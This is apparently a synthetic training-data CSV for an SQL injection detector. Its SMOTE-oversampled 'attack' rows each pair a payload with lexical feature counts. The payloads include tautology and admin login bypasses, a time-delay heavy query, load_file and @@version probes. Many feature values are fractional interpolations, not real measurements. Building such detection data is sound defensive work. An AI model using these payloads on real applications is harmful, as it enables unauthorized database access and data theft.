id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000168,attack,boolean,"1%'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000302,0.43942029194812315,191.91702212563249,32.14108032702038,3.6119009333688292,53.28216065404076,25.7054016351019,79.99999999999999,32.92945983648981,0.2776226904902799,0.13375952569458094,0.416965358534786,0.17165242528035318,0.9294598364898099,0.07054016351019021,2.0,0.0,0.0,1.07054016351019,0.0,17.92945983648981,0.9294598364898099,1.0,3.0,9.070540163510191,0.9294598364898099,0.07054016351019005,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.07054016351019005,0.0,0.9294598364898099,0.0705401635101901,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.07054016351019
SMOTE_000169,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,0.0,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000171,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000125,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000172,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,0.24636441019422337,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.21412213501122374,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000173,attack,boolean,select * from users where id  =  1 <@$ or 1  =  1 -- 1,nearest_attack_euclidean,R000215,0.06956965598036693,54.207858988329754,22.0,3.6542570738016225,24.0,4.207858988329753,18.0,8.0,0.4427647758518808,0.07757338364191503,0.33207358188891056,0.14758825861729358,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000174,attack,boolean,select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',nearest_attack_euclidean,R000239,0.0055008584711328185,58.00653663768706,23.0,3.785785352280473,24.006536637687066,4.0,18.00326831884353,11.996731681156467,0.4138569671498162,0.0689580038647275,0.31036548937199937,0.20681953961345698,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0032683188435327,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.003268318843533
SMOTE_000175,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000176,attack,boolean,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,nearest_attack_euclidean,R000077,0.19708839105369802,57.0,22.408922287280546,3.6713333691226704,24.0,4.5910777127194535,19.0,9.408922287280546,0.42105263157894735,0.08054522303016586,0.3333333333333333,0.16506881205755344,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000177,attack,boolean," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000161,0.10601792121057525,64.60189055699972,21.0,3.487340278492407,26.0,5.0,23.73459370466648,9.86729685233324,0.40269904707118837,0.07744212443676698,0.3672237855111677,0.15263504298087704,0.0,2.0,2.0,0.0,1.0,2.93364842616662,0.0,0.0,0.0,0.0,0.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000178,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000179,attack,boolean," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",nearest_attack_euclidean,R000095,0.10851659235375902,59.0,21.77005156110159,3.611496455412196,26.0,4.229948438898412,20.0,8.770051561101589,0.4406779661016949,0.07169404133726122,0.3389830508474576,0.14864494171358625,0.0,2.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000180,attack,boolean,-7999  )   or 8422  =  1336,nearest_attack_euclidean,R000293,0.07276359536630303,26.78677860274882,13.88628192146604,3.1850152795682702,2.0,11.872067161649294,9.94314096073302,2.97157048036651,0.07539025553858747,0.4416804633689662,0.37221302442068915,0.11071625667175708,0.0,0.0,0.985785240183255,0.0,0.0,1.0,0.0,0.985785240183255,0.0,0.0,0.0,1.985785240183255,0.0,0.0,0.0,0.0,0.0,1.0,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000181,attack,boolean,a' or 1  =  1--,nearest_attack_euclidean,R000126,0.02070657592657574,15.064830653313514,8.032415326656754,2.6091550153669196,3.0324153266567535,2.0,6.032415326656755,4.0,0.20114407035259135,0.13282485762107052,0.4003813567841971,0.26564971524214104,1.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000182,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.13115965309390962,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.311433253128228,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000183,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000176,0.9007943426202594,80.60286930852385,22.518784195233692,3.3681622043723705,17.415027356186954,14.726297873327166,33.423975688542356,15.037568390467381,0.22003909803298352,0.18418937159485307,0.40916920903203735,0.18660232134012605,0.0,0.0,0.0,0.0,0.0,1.0,0.10375683904673799,5.726297873327166,0.0,1.0,4.311270517140214,1.2075136780934757,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.10375683904673799,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.103756839046738,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.103756839046738
SMOTE_000184,attack,boolean," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000119,0.10556933657345824,59.0,21.0,3.5643844336773562,26.0,5.0,20.0,8.0,0.4406779661016949,0.0847457627118644,0.3389830508474576,0.13559322033898305,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.250670089041161,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000185,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,0.0,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000186,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,0.0,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000187,attack,boolean,or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000045,0.7142905504162472,20.11367174244625,6.0,2.165763570251861,4.0,1.528417935611563,9.821044839028907,4.764208967805782,0.20631595139680192,0.06947354252779833,0.48315778341469867,0.24105272266070105,3.0,0.0,0.0,0.0,0.0,1.7642089678057815,0.0,0.0,0.0,0.0,0.0,1.7642089678057817,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7642089678057815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7642089678057815
SMOTE_000188,attack,boolean,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,nearest_attack_euclidean,R000057,0.007931271749146944,55.046430669291574,22.976784665354213,3.718065132756454,24.0,4.0,18.023215334645787,9.023215334645787,0.43600818626379656,0.07266803104396609,0.3274134262705805,0.16391035642165683,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000189,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000125,0.07993253823186834,59.0,21.83062164057166,3.6152021538934678,26.0,4.169378359428339,20.0,8.830621640571662,0.4406779661016949,0.07066742982081929,0.3389830508474576,0.14967155323002818,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000190,attack,boolean,"admin"" or ""1""  =  ""1""#",nearest_attack_euclidean,R000209,0.3644434104091868,21.64757748535417,12.0,3.141226038324531,7.0,2.0,6.0,6.647577485354173,0.32441150909727473,0.09268900259922136,0.278067007797664,0.3048324805058399,0.0,4.647577485354173,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000191,attack,boolean, or uid like '%,nearest_attack_euclidean,R000099,0.19223743263895174,15.46904470738373,11.46904470738373,3.300966067094677,9.46904470738373,0.0,4.0,2.0,0.6110363460560878,0.0,0.2593091026292748,0.1296545513146374,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000192,attack,boolean," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000098,0.0,63.0,21.0,3.4316006148499936,26.0,5.0,24.0,8.0,0.4126984126984127,0.07936507936507936,0.38095238095238093,0.12698412698412698,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000193,attack,boolean,"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R000279,3.753103689437921,245.1860532437511,36.1395343658653,3.824053271409787,75.0,33.29069845120205,97.17442352427963,39.720931268269396,0.3067233071452773,0.1358328358609672,0.395418414957061,0.16202544203669458,2.279068731730603,0.0,0.0,0.0,0.0,2.0,0.0,20.581396902404098,0.0,1.4302328170673493,3.4302328170673495,12.0,0.5697671829326507,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.5697671829326508,0.0,0.5697671829326507,0.5697671829326507,0.8604656341346986,0.5697671829326507,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.860465634134699,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000194,attack,boolean,admin'or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000175,0.5139126881882551,27.56361622583803,9.690848677514092,2.710182887151338,8.127232451676063,2.0,11.43638377416197,6.0,0.2942988923470734,0.07258302585757134,0.4153690042226412,0.21774907757271403,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000195,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000076,1.6316569568245969,28.92080395086952,13.0,2.9406879850818175,7.0,2.0,11.841607901739035,8.079196049130482,0.242326633742754,0.06923618106935829,0.4075678354047593,0.2808693497831284,0.0,4.539598024565241,1.079196049130482,0.0,0.0,1.0,0.0,1.460401975434759,0.0,0.0,0.0,2.079196049130482,0.0,1.0,0.539598024565241,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000196,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000002,1.6858739404357614e-07,15.0,7.0,2.33012496531497,2.0,2.0,7.0,4.0,0.13333333333333333,0.13333333333333333,0.4666666666666667,0.26666666666666666,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000197,attack,boolean,admin'  )   or '1'  =  '1'/*,nearest_attack_euclidean,R000213,0.1780726153838056,27.70905305852027,13.967672562057807,3.1410830790923447,7.0,2.0,9.87069024823123,8.83836281028904,0.25382824922999647,0.07252235692285612,0.3558060082053981,0.3178433856417494,4.8383628102890395,0.03232743794219217,0.0,1.0,1.0,1.0,0.0,0.9676725620578078,0.0,0.0,0.0,3.0,0.9676725620578078,0.03232743794219217,0.0,0.0,1.0000000000000002,1.0,0.9676725620578077,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000198,attack,boolean, or 1 in   (  select @@version  )  --,nearest_attack_euclidean,R000053,1.241147635358913,28.441632023551772,12.887866190382463,3.092686147726378,12.720816011775886,0.6109832737978076,10.276882916584654,4.832949821393424,0.4363287351987886,0.01651306145399481,0.3702764893828094,0.17688171396440727,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.6109832737978078,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.6109832737978079,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6109832737978078
SMOTE_000199,attack,boolean,select * from users where id  =  1 <@.. or 1  =  1 -- 1,nearest_attack_euclidean,R000249,0.01967223290411383,55.0,22.129485592833582,3.6874650441265735,24.0,4.0,18.0,9.0,0.43636363636363634,0.07272727272727272,0.32727272727272727,0.16363636363636364,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000200,attack,boolean,select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',nearest_attack_euclidean,R000225,0.46022640762848405,59.450962918584636,23.0,3.742804191759265,25.45096291858464,4.27451854070768,18.725481459292318,11.0,0.42796917794019473,0.07203082205980525,0.31493120462771007,0.18506879537228993,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.7254814592923196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.72548145929232
